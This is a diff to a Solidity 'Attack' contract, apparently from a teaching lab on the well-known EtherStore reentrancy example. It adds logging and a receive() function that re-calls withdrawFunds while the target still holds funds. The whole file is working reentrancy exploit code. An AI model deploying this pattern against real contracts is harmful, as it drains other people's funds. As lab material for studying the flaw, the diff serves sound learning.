@@ -2,9 +2,12 @@
 pragma solidity ^0.8.0;
 
 import "./EtherStore.sol";
+import "hardhat/console.sol";
 
 
 contract Attack {
+    event received(address _from, uint256 _value);
+
     EtherStore public etherStore;
 
     constructor(address _etherStoreAddress) {
@@ -22,13 +25,20 @@ contract Attack {
         owner.transfer(address(this).balance);
     }
 
-    fallback() external payable {
+    fallback() external {
+        console.log("received ether");
         if (address(etherStore).balance > 0.01 ether) {
+            console.log("let's receive more!!");
             etherStore.withdrawFunds(0.01 ether);
         }
     }
 
     receive() external payable {
-
+        console.log("received ether");
+        emit received(msg.sender, msg.value);
+        if (address(etherStore).balance > 0.01 ether) {
+            console.log("let's receive more!!");
+            etherStore.withdrawFunds(0.01 ether);
+        }
     }
 }
